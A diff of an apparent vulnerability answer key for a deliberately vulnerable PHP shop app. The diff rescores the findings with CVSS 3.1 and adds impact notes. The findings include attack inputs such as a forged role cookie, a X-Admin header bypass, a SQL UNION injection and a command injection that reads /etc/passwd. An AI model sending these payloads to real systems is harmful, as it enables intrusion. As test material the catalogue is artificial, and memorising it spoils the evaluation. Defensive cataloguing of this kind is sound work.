+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "详情入口只读，不附加订单修改、支付或服务中断能力。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "17",
@@ -580,10 +1601,13 @@
       "class": "auth_bypass",
       "scenario": null,
       "cwe": "CWE-807",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/ops/users.php", "line": 2 }
+        {
+          "path": "app/public/ops/users.php",
+          "line": 2
+        }
       ],
       "entry_point": {
         "route": "GET /ops/users.php",
@@ -600,12 +1624,71 @@
         "sink": "角色校验 if($role!=='admin') fail_request(...)（app/public/ops/users.php:2）",
         "flow": "任意登录用户设置 Cookie role=admin → 通过管理员校验 → 读取全部用户列表"
       },
-      "evidence": ["app/public/ops/users.php:2"],
-      "preconditions": ["任意用户登录", "设置 Cookie role=admin"],
+      "evidence": [
+        "app/public/ops/users.php:2"
+      ],
+      "preconditions": [
+        "普通会员已登录；人员管理 HTTP 入口可达。"
+      ],
       "attack_input": "Cookie: role=admin",
       "normal_input": "普通 customer 无 admin Cookie",
       "expected_result": "普通用户通过伪造 Cookie 访问管理员功能（权限绕过）",
-      "remediation": "角色只取服务端会话/数据库，绝不信任客户端 Cookie"
+      "remediation": "角色只取服务端会话/数据库，绝不信任客户端 Cookie",
+      "description": "人员管理把客户端 role Cookie 优先当作权限判定来源，覆盖了数据库中的真实角色。",
+      "impact": "普通会员可访问原本仅管理员可见的用户名、邮箱和角色清单。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 4.3,
+        "environmental_score": 4.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "伪造仅影响该页面的局部权限变量，不改变数据库角色或整个会话权限；未并入其他后台功能。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "18",
@@ -614,10 +1697,13 @@
       "class": "auth_bypass",
       "scenario": null,
       "cwe": "CWE-807",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/ops/maintenance.php", "line": 3 }
+        {
+          "path": "app/public/ops/maintenance.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "POST /ops/maintenance.php",
@@ -634,12 +1720,71 @@
         "sink": "身份校验 if(X-Admin!=1) 403（app/public/ops/maintenance.php:3）",
         "flow": "请求头 X-Admin: 1 → 通过身份校验 → 未登录即可调用内部维护接口"
       },
-      "evidence": ["app/public/ops/maintenance.php:3"],
-      "preconditions": [],
+      "evidence": [
+        "app/public/ops/maintenance.php:3"
+      ],
+      "preconditions": [
+        "维护接口可通过 HTTP 访问。"
+      ],
       "attack_input": "POST /ops/maintenance.php with Header: X-Admin: 1",
       "normal_input": "不带 X-Admin 头的请求（返回 403）",
       "expected_result": "伪造请求头绕过认证，未登录即可触发内部维护作业（认证绕过）",
-      "remediation": "使用服务端会话/令牌校验身份，不信任客户端请求头"
+      "remediation": "使用服务端会话/令牌校验身份，不信任客户端请求头",
+      "description": "内部维护接口用一个客户端可自行设置的请求头值作为服务身份依据，没有独立认证。",
+      "impact": "未授权请求可新增一条固定的系统对账排队任务，破坏任务记录的真实性。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 5.3,
+        "environmental_score": 5.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "不把 accepted=true 当成外部资金已经划转，也不把少量队列记录变更直接记为全站停机。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "19",
@@ -648,11 +1793,17 @@
       "class": "price_manipulation",
       "scenario": null,
       "cwe": "CWE-602",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/orders/create.php", "line": 3 },
-        { "path": "app/public/orders/create.php", "line": 5 }
+        {
+          "path": "app/public/orders/create.php",
+          "line": 3
+        },
+        {
+          "path": "app/public/orders/create.php",
+          "line": 5
+        }
       ],
       "entry_point": {
         "route": "POST /orders/create.php",
@@ -669,12 +1820,72 @@
         "sink": "INSERT INTO orders(...unit_price,total...)=$price（app/public/orders/create.php:7）",
         "flow": "price → 客户端伪造极低/任意单价 → total 与 unit_price 被篡改"
       },
-      "evidence": ["app/public/orders/create.php:3", "app/public/orders/create.php:5"],
-      "preconditions": ["需要登录", "提供合法 product_id 并伪造 price"],
+      "evidence": [
+        "app/public/orders/create.php:3",
+        "app/public/orders/create.php:5"
+      ],
+      "preconditions": [
+        "普通会员登录；商品有库存；下单请求通过正常页面令牌校验。"
+      ],
       "attack_input": "product_id=1&quantity=1&price=0.01",
       "normal_input": "product_id=1&quantity=1&price=129",
       "expected_result": "正常下单按真实价格；伪造价格以 0.01 元成交（金额篡改）",
-      "remediation": "单价只从服务端商品表读取，不接受客户端传入"
+      "remediation": "单价只从服务端商品表读取，不接受客户端传入",
+      "description": "下单虽查询商品及锁定库存，但金额计算采用请求中的 price，没有使用数据库商品价格。",
+      "impact": "会员可让商品订单以非授权低价落库，破坏交易金额与商品定价的一致性，造成直接的财务完整性影响。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "H",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 6.5,
+        "environmental_score": 6.5,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "价格问题本身不读取他人隐私，也不等于支付系统或商城服务不可用。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "20",
@@ -683,11 +1894,17 @@
       "class": "race_condition",
       "scenario": null,
       "cwe": "CWE-362",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/wallet/withdraw.php", "line": 3 },
-        { "path": "app/public/wallet/withdraw.php", "line": 7 }
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 3
+        },
+        {
+          "path": "app/public/wallet/withdraw.php",
+          "line": 7
+        }
       ],
       "entry_point": {
         "route": "POST /wallet/withdraw.php",
@@ -704,12 +1921,72 @@
         "sink": "UPDATE users SET balance=? WHERE id=?（app/public/wallet/withdraw.php:7）",
         "flow": "并发两次提现 → 均读到同一余额 → 均通过校验 → 重复扣款/超额提现（TOCTOU）"
       },
-      "evidence": ["app/public/wallet/withdraw.php:3", "app/public/wallet/withdraw.php:7"],
-      "preconditions": ["需要登录", "并发提交两个提现请求"],
+      "evidence": [
+        "app/public/wallet/withdraw.php:3",
+        "app/public/wallet/withdraw.php:7"
+      ],
+      "preconditions": [
+        "普通会员登录且余额充足；多个请求竞争相同余额。"
+      ],
       "attack_input": "并发 POST amount=全部余额（两次）",
       "normal_input": "单次合法提现",
       "expected_result": "并发请求绕过后一次余额校验，导致重复支付/余额变负",
-      "remediation": "使用事务 + SELECT ... FOR UPDATE 或原子 UPDATE ... WHERE balance>=amount"
+      "remediation": "使用事务 + SELECT ... FOR UPDATE 或原子 UPDATE ... WHERE balance>=amount",
+      "description": "提现释放 PHP 会话锁后，分别读取余额、等待、覆盖余额并新增流水，缺少原子扣款和行级串行保护。",
+      "impact": "并发请求可能用同一旧余额多次批准提现，造成余额与资金流水不守恒。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "H",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 5.3,
+        "environmental_score": 5.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "只评分本应用余额及流水，不假设已经连接真实银行或第三方支付。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "21",
@@ -721,8 +1998,14 @@
       "severity": "high",
       "severity_cn": "高",
       "location": [
-        { "path": "app/src/bootstrap.php", "line": 13 },
-        { "path": "app/public/auth/login.php", "line": 8 }
+        {
+          "path": "app/src/bootstrap.php",
+          "line": 13
+        },
+        {
+          "path": "app/public/auth/login.php",
+          "line": 8
+        }
       ],
       "entry_point": {
         "route": "GET /auth/login.php",
@@ -739,12 +2022,72 @@
         "sink": "$_SESSION['user_id']=(int)$row['id']（app/public/auth/login.php:8）",
         "flow": "攻击者固定 sid → 受害者用该 sid 登录 → 会话 id 不变 → 攻击者复用 sid 劫持"
       },
-      "evidence": ["app/src/bootstrap.php:13", "app/public/auth/login.php:8"],
-      "preconditions": ["攻击者先获取/固定一个会话 id", "诱导受害者使用该 sid 登录"],
+      "evidence": [
+        "app/src/bootstrap.php:13",
+        "app/public/auth/login.php:8"
+      ],
+      "preconditions": [
+        "受害者通过预设会话的登录入口进行认证；会话成功保留到登录后。"
+      ],
       "attack_input": "?sid=<攻击者预设的会话id>（诱导受害者登录）",
       "normal_input": "正常登录（无 sid 参数）",
       "expected_result": "登录后会话 id 不轮换，攻击者可用同一 id 接管受害者会话（会话固定）",
-      "remediation": "登录成功后 session_regenerate_id(true)，并开启 use_strict_mode"
+      "remediation": "登录成功后 session_regenerate_id(true)，并开启 use_strict_mode",
+      "description": "登录接受调用者指定的会话 ID，禁用严格会话检查，认证成功后没有重新生成会话 ID。",
+      "impact": "受害者使用预设会话完成登录后，攻击者可能以该已知会话身份访问其受限业务信息与操作。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 8.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 8.1,
+        "environmental_score": 8.1,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "未将任意命令执行或所有用户会话统一接管计入，也没有把用户登录动作重复计入 AC。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "22",
@@ -756,7 +2099,10 @@
       "severity": "medium",
       "severity_cn": "中",
       "location": [
-        { "path": "app/public/account/redeem.php", "line": 5 }
+        {
+          "path": "app/public/account/redeem.php",
+          "line": 5
+        }
       ],
       "entry_point": {
         "route": "POST /account/redeem.php",
@@ -773,12 +2119,71 @@
         "sink": "松散比较 ==（app/public/account/redeem.php:5）",
         "flow": "token → md5 后与 secret_hash 松散比较 → 构造 md5 为 0e+数字的 magic hash 通过校验"
       },
-      "evidence": ["app/public/account/redeem.php:5"],
-      "preconditions": ["需要登录", "构造 md5 值为 0e+数字 的 magic hash token"],
+      "evidence": [
+        "app/public/account/redeem.php:5"
+      ],
+      "preconditions": [
+        "普通会员登录并提交兑换请求。"
+      ],
       "attack_input": "提交 md5 值为 0e 开头后跟纯数字的 token（magic hash 绕过）",
       "normal_input": "正确兑换码",
       "expected_result": "无需真实兑换码即可升级金卡（弱类型比较绕过）",
-      "remediation": "使用 hash_equals() 严格比较，或用 === 比较"
+      "remediation": "使用 hash_equals() 严格比较，或用 === 比较",
+      "description": "兑换逻辑对 MD5 结果使用弱类型相等比较，摘要可按数字语义比较，而非按字符串严格比较。",
+      "impact": "未持有真实活动兑换资格的会员可能被授予 gold 等级。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 4.3,
+        "environmental_score": 4.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "没有把描述中的会员优惠视作已实现的额外资金损失。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "23",
@@ -787,11 +2192,17 @@
       "class": "sqli",
       "scenario": "sqli",
       "cwe": "CWE-89",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/ops/members.php", "line": 2 },
-        { "path": "app/src/member_lookup.php", "line": 3 }
+        {
+          "path": "app/public/ops/members.php",
+          "line": 2
+        },
+        {
+          "path": "app/src/member_lookup.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /ops/members.php",
@@ -808,12 +2219,76 @@
         "sink": "db()->query() 原始拼接（app/src/member_lookup.php:3）",
         "flow": "q → member_lookup() → WHERE username LIKE '%...%' → query() 执行任意 SQL"
       },
-      "evidence": ["app/public/ops/members.php:2", "app/src/member_lookup.php:3"],
-      "preconditions": ["需要 operator/admin 登录"],
+      "evidence": [
+        "app/public/ops/members.php:2",
+        "app/src/member_lookup.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；使用默认数据库连接及授权。"
+      ],
       "attack_input": "?q=' UNION SELECT id,username,email,role FROM users -- ",
       "normal_input": "?q=alice",
       "expected_result": "正常输入返回匹配会员；注入输入可提取全部用户信息",
-      "remediation": "member_lookup 使用预处理语句绑定参数"
+      "remediation": "member_lookup 使用预处理语句绑定参数",
+      "description": "后台会员查询将 q 传入跨文件 helper；helper 内把输入拼接进 users 的 LIKE 查询。",
+      "impact": "可改变单条查询的结构并读取正常功能不应返回的敏感业务数据；没有把数据库写入或删表当作已建立的影响。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.9,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 4.9,
+        "environmental_score": 4.9,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "字符串拼接仍然有 SQL 注入；关闭模拟预处理不等于把已拼接的输入变为绑定参数。但它会影响能否把 SELECT 任意扩展成堆叠写语句。",
+          "本版本 PDO::ATTR_EMULATE_PREPARES=false，PDO::query 会先调用驱动 preparer；PHP 8.4.27 普通 SELECT 走原生 mysql_stmt_prepare。没有仅凭默认多语句连接标志推定堆叠写入已可用。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide",
+          "https://www.php.net/manual/en/class.pdo-mysql.php#pdo-mysql.constants.attr-multi-statements",
+          "https://raw.githubusercontent.com/php/php-src/php-8.4.27/ext/pdo_mysql/mysql_driver.c",
+          "https://raw.githubusercontent.com/php/php-src/php-8.4.27/ext/pdo/pdo_dbh.c"
+        ]
+      }
     },
     {
       "id": "24",
@@ -822,11 +2297,17 @@
       "class": "command_injection",
       "scenario": "command_injection",
       "cwe": "CWE-78",
-      "severity": "critical",
-      "severity_cn": "极高",
+      "severity": "high",
+      "severity_cn": "高",
       "location": [
-        { "path": "app/public/ops/batch-check.php", "line": 2 },
-        { "path": "app/src/host_check.php", "line": 2 }
+        {
+          "path": "app/public/ops/batch-check.php",
+          "line": 2
+        },
+        {
+          "path": "app/src/host_check.php",
+          "line": 2
+        }
       ],
       "entry_point": {
         "route": "GET /ops/batch-check.php",
@@ -843,12 +2324,72 @@
         "sink": "shell_exec()（app/src/host_check.php:2）",
         "flow": "host → host_check() → 拼接 ping 命令 → shell_exec() 执行任意命令"
       },
-      "evidence": ["app/public/ops/batch-check.php:2", "app/src/host_check.php:2"],
-      "preconditions": ["需要 operator/admin 登录"],
+      "evidence": [
+        "app/public/ops/batch-check.php:2",
+        "app/src/host_check.php:2"
+      ],
+      "preconditions": [
+        "运营员或管理员权限。"
+      ],
       "attack_input": "?host=127.0.0.1; cat /etc/passwd",
       "normal_input": "?host=127.0.0.1",
       "expected_result": "正常输入返回 ping 输出；注入输入追加执行任意命令（RCE）",
-      "remediation": "host_check 使用 escapeshellarg() 或白名单/免 shell 实现"
+      "remediation": "host_check 使用 escapeshellarg() 或白名单/免 shell 实现",
+      "description": "主机巡检把 host 跨文件传给公共 helper；helper 将其直接拼接到系统 ping 命令。",
+      "impact": "HTTP 参数跨文件到达命令解释器，达到 Web 进程权限内的代码执行。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.2,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "H",
+          "A": "H",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 7.2,
+        "environmental_score": 7.2,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
